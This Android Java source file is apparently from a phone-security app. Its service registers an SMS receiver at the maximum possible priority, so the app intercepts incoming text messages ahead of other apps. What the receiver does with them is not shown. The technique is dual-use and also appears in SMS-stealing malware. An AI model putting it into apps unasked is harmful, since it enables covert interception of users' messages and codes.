package com.androidsafe.phone;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

import com.androidsafe.sms.ReceiveSms;

public class SmsRecevier extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	public void onCreate() {
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(2147483647);
		Log.v("MyBrocast.onReceive", "onCreate");
		registerReceiver(new ReceiveSms(),
				localIntentFilter);
	}

}
